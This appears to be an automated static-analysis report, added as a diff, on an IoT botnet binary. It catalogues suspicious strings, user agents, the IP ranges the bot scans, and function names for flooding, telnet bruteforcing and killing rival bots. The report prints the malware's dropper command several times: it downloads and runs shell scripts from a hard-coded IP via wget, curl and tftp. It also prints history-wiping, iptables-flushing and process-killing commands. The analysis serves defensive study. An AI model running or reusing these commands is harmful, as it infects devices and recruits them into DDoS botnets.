@@ -1,0 +1,3193 @@
+=============================================================================
+========	BINARY ID :6927769f329d005c0b246a2a52268ab8157849a9==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :2162
+SUPSCPECTED LINES COUNT :211
+SUPSCPECTED STRINGS COUNT (DISTINCT) :27
+SUPSCPECTED STRINGS WEIGHT :104
+SUSPECT STRING SCORE : [104 / 150] 69%
+USER AGENTS STRINGS COUNT :62
+STATIC IPs STRINGS COUNT :2
+DYNAMIC IPs STRINGS COUNT :199
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+nopqrstuvwß
+)*+%ÉÈPQRSTUVWXYZ
+telnet
+cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
+/bin/sh
+/proc/cpuinfo
+PING
+gethostbyname
+\e[0;31m[LoveSec] Bruteforced IP: \e[0;33m%s | \e[0;31mUsername: \e[0;33m%s | \e[0;31mPassword: \e[0;33m%s\e[0m
+p%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00
+cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
+bin*
+bot*
+/dev/netslink/
+/usr/
+>%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\r\n
+pkill -9 %s\r\n
+rm -rf /bin/netstat
+pkill -9 busybox
+pkill -9 perl
+/sbin/iptables -F;/sbin/iptables -X
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
+Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
+Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
+Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
+Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
+BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
+Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
+AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
+AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
+AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
+AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
+AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
+AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
+magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
+%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
+http
+Failed opening raw socket.
+Invalid flag "%s"
+GETLOCALIP
+BOTKILL
+Killing Bots
+LOOPING PAYLOAD
+TELNET
+TELNET ON | OFF
+NETIS
+[NETIS] SCANNER Starting
+HTTP
+/proc/net/route
+/usr/bin/python
+/usr/sbin/dropbear
+\e[1;36mWiFi's \e[0;32mPenthouse\e[1;34m Zombie Connected| \e[1;31m%s
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+;<=>?@ABCDEFGJIMOPQRSTUVWX[\\^_`abcxyz{|}~
+No such process
+Interrupted system call
+No child processes
+Too many open files in system
+Read-only file system
+Level 2 not synchronized
+Machine is not on the network
+Name not unique on network
+Interrupted system call should be restarted
+Socket operation on non-socket
+Protocol wrong type for socket
+Socket type not supported
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+Transport endpoint is already connected
+Transport endpoint is not connected
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+Unknown host
+Host name lookup failure
+/bin/sh
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+/etc/hosts
+/etc/config/hosts
+fdopen_pids
+fork.c
+getpid.c
+kill.c
+sigprocmask.c
+vfork.c
+waitpid.c
+spec_flags.4045
+strstr.c
+_string_syserrmsgs.c
+error_msg
+inet_ntoa.c
+inet_makeaddr.c
+gethostbyname.c
+gethostbyname_r.c
+connect.c
+socket.c
+rand.c
+random.c
+randtbl
+random_r.c
+random_poly_info
+system.c
+inet_aton.c
+dnslookup.c
+get_hosts_byname_r.c
+inet_pton4
+inet_ntop4
+read_etc_hosts_r.c
+__open_etc_hosts
+__GI_inet_ntoa_r
+__GI_sigprocmask
+__GI_kill
+__GI_fork
+__GI_getpid
+__GI_socket
+__GI_connect
+__GI_inet_addr
+__read_etc_hosts_r
+waitpid
+random
+connect
+numpids
+initConnection
+inet_pton
+sendTCP
+__GI_random_r
+getpid
+getHost
+__libc_getpid
+makeRandomStr
+sendHTTP
+system
+__dns_lookup
+random_r
+gethostbyname_r
+tcpcsum
+socket
+_string_syserrmsgs
+__GI_inet_ntoa
+srandom_r
+hostname_to_ip
+__GI_srandom_r
+Server_Botport
+kill
+inet_addr
+connectTimeout
+ngPid
+strstr
+init_rand
+rand
+StartTheNetis
+HackerScan2
+__GI_gethostbyname_r
+__GI_inet_ntop
+fork
+__GI_gethostbyname
+__GI_random
+inet_aton
+processCmd
+get_telstate_host
+listFork
+srand
+sendUDP
+inet_ntoa
+__libc_system
+__get_hosts_byname_r
+botkiller
+HackerScan
+__GI_inet_pton
+gethostbyname
+__vfork
+__libc_waitpid
+socket_connect
+__GI_waitpid
+vfork
+srandom
+__libc_fork
+scanPid
+rand_cmwc
+inet_ntoa_r
+__GI_strstr
+inet_ntop
+__GI_inet_aton
+hekkertelnet
+__GI_vfork
+NetisRanges
+__libc_connect
+pids
+sigprocmask
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)
+Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5
+Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0
+Opera/6.04 (Windows XP; U) [en]
+Opera/9.99 (X11; U; sk)
+Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5
+Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc
+Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk
+Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41
+Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)
+Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
+Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
+Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
+Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
+Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
+Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
+Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
+Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
+Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
+Mozilla/5.0 (PLAYSTATION 3; 3.55)
+Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
+wii libnup/1.0
+Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
+PSP (PlayStation Portable); 2.00
+Bunjalloo/0.7.6(Nintendo DS;U;en)
+Doris/1.15 [en] (Symbian)
+BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
+BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
+findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
+Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
+Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
+Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
+Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
+Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
+Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
+Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
+AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
+AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
+AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
+AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
+AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
+AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
+AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
+AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
+AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
+MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
+Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
+%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+188.213.170.176
+8.8.8.8
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+112.5.%d.%d
+117.165.%d.%d
+85.3.%d.%d
+37.158.%d.%d
+95.9.%d.%d
+41.252.%d.%d
+58.71.%d.%d
+104.55.%d.%d
+78.186.%d.%d
+78.189.%d.%d
+221.120.%d.%d
+88.5.%d.%d
+41.254.%d.%d
+103.20.%d.%d
+103.47.%d.%d
+103.57.%d.%d
+45.117.%d.%d
+101.51.%d.%d
+137.59.%d.%d
+1.56.%d.%d
+1.188.%d.%d
+14.204.%d.%d
+27.0.%d.%d
+27.8.%d.%d
+27.50.%d.%d
+27.54.%d.%d
+27.98.%d.%d
+27.112.%d.%d
+27.192.%d.%d
+36.32.%d.%d
+36.248.%d.%d
+39.64.%d.%d
+42.4.%d.%d
+42.48.%d.%d
+42.52.%d.%d
+42.56.%d.%d
+42.63.%d.%d
+42.84.%d.%d
+42.176.%d.%d
+42.224.%d.%d
+43.253.%d.%d
+43.230.%d.%d
+163.53.%d.%d
+62.252.%d.%d
+43.245.%d.%d
+62.255.%d.%d
+123.25.%d.%d
+103.54.%d.%d
+27.255.%d.%d
+103.204.%d.%d
+123.24.%d.%d
+113.191.%d.%d
+81.100.%d.%d
+113.188.%d.%d
+113.189.%d.%d
+94.174.%d.%d
+14.160.%d.%d
+14.161.%d.%d
+14.162.%d.%d
+14.163.%d.%d
+14.164.%d.%d
+14.165.%d.%d
+14.166.%d.%d
+14.167.%d.%d
+14.168.%d.%d
+14.169.%d.%d
+14.170.%d.%d
+14.171.%d.%d
+14.172.%d.%d
+14.173.%d.%d
+14.174.%d.%d
+14.175.%d.%d
+14.176.%d.%d
+14.177.%d.%d
+14.178.%d.%d
+14.179.%d.%d
+14.180.%d.%d
+14.181.%d.%d
+14.182.%d.%d
+14.183.%d.%d
+14.184.%d.%d
+14.185.%d.%d
+14.186.%d.%d
+14.187.%d.%d
+14.188.%d.%d
+14.189.%d.%d
+14.190.%d.%d
+14.191.%d.%d
+45.121.%d.%d
+45.120.%d.%d
+45.115.%d.%d
+43.252.%d.%d
+43.240.%d.%d
+41.174.%d.%d
+49.118.%d.%d
+78.188.%d.%d
+45.127.%d.%d
+103.30.%d.%d
+14.33.%d.%d
+123.16.%d.%d
+202.44.%d.%d
+116.93.%d.%d
+91.83.%d.%d
+41.253.%d.%d
+117.173.%d.%d
+113.190.%d.%d
+146.88.%d.%d
+112.196.%d.%d
+113.178.%d.%d
+112.45.%d.%d
+183.223.%d.%d
+116.71.%d.%d
+103.44.%d.%d
+110.235.%d.%d
+124.253.%d.%d
+211.237.%d.%d
+117.175.%d.%d
+178.93.%d.%d
+111.9.%d.%d
+222.252.%d.%d
+113.174.%d.%d
+113.160.%d.%d
+113.161.%d.%d
+113.162.%d.%d
+113.163.%d.%d
+113.164.%d.%d
+113.165.%d.%d
+113.166.%d.%d
+113.167.%d.%d
+113.168.%d.%d
+113.169.%d.%d
+123.17.%d.%d
+123.18.%d.%d
+123.19.%d.%d
+123.20.%d.%d
+123.21.%d.%d
+123.22.%d.%d
+222.253.%d.%d
+222.254.%d.%d
+222.255.%d.%d
+37.247.%d.%d
+41.208.%d.%d
+183.220.%d.%d
+175.201.%d.%d
+103.198.%d.%d
+50.205.%d.%d
+88.248.%d.%d
+88.105.%d.%d
+88.247.%d.%d
+85.105.%d.%d
+188.3.%d.%d
+103.203.%d.%d
+103.55.%d.%d
+103.220.%d.%d
+183.233.%d.%d
+103.242.%d.%d
+103.14.%d.%d
+103.195.%d.%d
+103.214.%d.%d
+103.218.%d.%d
+103.225.%d.%d
+103.228.%d.%d
+103.231.%d.%d
+103.60.%d.%d
+103.248.%d.%d
+103.253.%d.%d
+103.255.%d.%d
+103.35.%d.%d
+103.49.%d.%d
+103.62.%d.%d
+144.48.%d.%d
+163.47.%d.%d
+223.29.%d.%d
+59.153.%d.%d
+113.176.%d.%d
+113.175.%d.%d
+113.177.%d.%d
+113.183.%d.%d
+202.164.%d.%d
+203.134.%d.%d
+210.56.%d.%d
+49.156.%d.%d
+203.210.%d.%d
+117.181.%d.%d
+117.178.%d.%d
+117.177.%d.%d
+117.176.%d.%d
+117.170.%d.%d
+117.171.%d.%d
+117.162.%d.%d
+112.26.%d.%d
+112.27.%d.%d
+112.28.%d.%d
+112.29.%d.%d
+112.30.%d.%d
+112.31.%d.%d
+203.150.%d.%d
+50.233.%d.%d
+%d.%d.%d.%d
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+/proc/cpuinfo
+/proc/net/route
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+history -c;history -w
+history -c
+rm -rf ~/.bash_history
+history -w
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
+p%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n x00
+cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n
+================================================================================
+========	FUNCTIONS SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES			: 166485
++++TOTAL FUNCTIONS 			:255
++++LINES PER FUNCTION RATIO 	: 652.882352941176
++++SUSPECTED LINES COUNT 	: 859
++++SUSPECTED LINES RATIO 	: 0.515962399014926
+================================================================================
+========	WHILES SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES				: 166485
++++WHILE (TRUE) LINES			: 14779
++++WHILE (TRUE) LINES RATION		:8.87707601285401%
++++WHILE (TRUE) LOOPS COUNT		: 130
+================================================================================
+========	SYSTEM FILES SUMMARY : ================================================
+================================================================================
+        "/dev/netslink/",
+        "/tmp/",
+        "/var/",
+        "/dev/",
+        "/var/run/",
+        "/dev/shm/",
+        "/boot/",
+        "/usr/"
+        "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n"
+        "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n"
+    char (*v50)[318] = "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n";
+    int32_t v499 = __GI_fopen((int32_t)&v497, (int32_t)&v498); // 0x419d8c
+        int32_t v506 = __GI_fopen((int32_t)&v505, (int32_t)&v498); // 0x419dac
+int32_t __GI_fopen(int32_t a1, int32_t a2) {
+    return _stdio_fopen(0, (char *)-1);
+int32_t _stdio_fopen(int32_t a1, char * a2) {
+    int32_t v503 = __GI_fopen((int32_t)&v502, (int32_t)&v501); // 0x41c32c
+        result = __GI_fopen((int32_t)&v504, (int32_t)&v501);
+================================================================================
+========	IP PATTERNS SUMMARY : =================================================
+================================================================================
+        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
+
+        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
+
+        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
+
+        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
+
+        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
+
+        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
+
+        "BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
+
+    char (*v46)[16] = "188.213.170.176";
+
+        "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n"
+
+        "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n"
+
+    char (*v50)[318] = "cd /tmp; wget http://188.213.170.176/gtop.sh || curl -O http://188.213.170.176/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\r\n";
+
+================================================================================
+========	SYSTEM CALLS SUMMARY : ================================================
+================================================================================
+    __libc_system(*(int32_t *)&v503 - 0x1b88);
+
+        __libc_system(v505);
+
+        __libc_system(v510);
+
+    __libc_system(*(int32_t *)&v503 - 0x1870);
+
+    __libc_system(*(int32_t *)&v503 - 0x1844);
+
+    __libc_system(*(int32_t *)&v503 - 0x182c);
+
+    __libc_system(*(int32_t *)&v503 - 0x1844);
+
+    __libc_system(*(int32_t *)&v503 - 0x1814);
+
+    __libc_system(*(int32_t *)&v503 - 0x1804);
+
+    __libc_system(*(int32_t *)&v503 - 0x17f8);
+
+    __libc_system(*(int32_t *)&v503 - 0x17e0);
+
+    __libc_system(*(int32_t *)&v503 - 0x17cc);
+
+    __libc_system(*(int32_t *)&v503 - 0x17c0);
+
+    __libc_system(*(int32_t *)&v503 - 0x17ac);
+
+    __libc_system(*(int32_t *)&v503 - 0x179c);
+
+    return __libc_system(*(int32_t *)&v503 - 0x1784);
+
+int32_t __libc_system(int32_t a1) {
+
+================================================================================
+========	FUNCTIONS LIST : =======================================================
+================================================================================
+FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
+----------------------------------------------------------------------------------------------
+processCmd                                        |2   |2670    |227           |425         |
+----------------------------------------------------------------------------------------------
+gethostbyname_r                                   |6   |979     |49            |0           |
+----------------------------------------------------------------------------------------------
+_init                                             |0   |751     |45            |0           |
+----------------------------------------------------------------------------------------------
+main                                              |0   |878     |43            |282         |
+----------------------------------------------------------------------------------------------
+_vfprintf_internal                                |0   |8660    |33            |8080        |
+----------------------------------------------------------------------------------------------
+__dns_lookup                                      |6   |1029    |29            |450         |
+----------------------------------------------------------------------------------------------
+fdpopen                                           |2   |732     |26            |0           |
+----------------------------------------------------------------------------------------------
+sendUDP                                           |6   |634     |19            |0           |
+----------------------------------------------------------------------------------------------
+StartTheLelz                                      |0   |781     |18            |252         |
+----------------------------------------------------------------------------------------------
+sendTCP                                           |7   |634     |17            |46          |
+----------------------------------------------------------------------------------------------
+fdpclose                                          |1   |595     |15            |46          |
+----------------------------------------------------------------------------------------------
+RemoveTMP                                         |0   |518     |13            |0           |
+----------------------------------------------------------------------------------------------
+getOurIP                                          |0   |560     |11            |22          |
+----------------------------------------------------------------------------------------------
+_fpmaxtostr                                       |5   |1527    |11            |929         |
+----------------------------------------------------------------------------------------------
+sendJUNK                                          |3   |660     |10            |133         |
+----------------------------------------------------------------------------------------------
+__read_etc_hosts_r                                |11  |863     |9             |226         |
+----------------------------------------------------------------------------------------------
+getBogos                                          |1   |596     |9             |48          |
+----------------------------------------------------------------------------------------------
+sendHOLD                                          |3   |653     |9             |127         |
+----------------------------------------------------------------------------------------------
+__open_nameservers                                |0   |711     |9             |159         |
+----------------------------------------------------------------------------------------------
+getCores                                          |0   |524     |7             |0           |
+----------------------------------------------------------------------------------------------
+sendCNC                                           |3   |525     |7             |0           |
+----------------------------------------------------------------------------------------------
+HackerScan2                                       |1   |12158   |7             |0           |
+----------------------------------------------------------------------------------------------
+sendHTTP                                          |6   |552     |7             |37          |
+----------------------------------------------------------------------------------------------
+_ppfs_parsespec                                   |1   |1334    |6             |816         |
+----------------------------------------------------------------------------------------------
+__GI_memmove                                      |2   |818     |6             |22          |
+----------------------------------------------------------------------------------------------
+NetisRanges                                       |0   |514     |6             |0           |
+----------------------------------------------------------------------------------------------
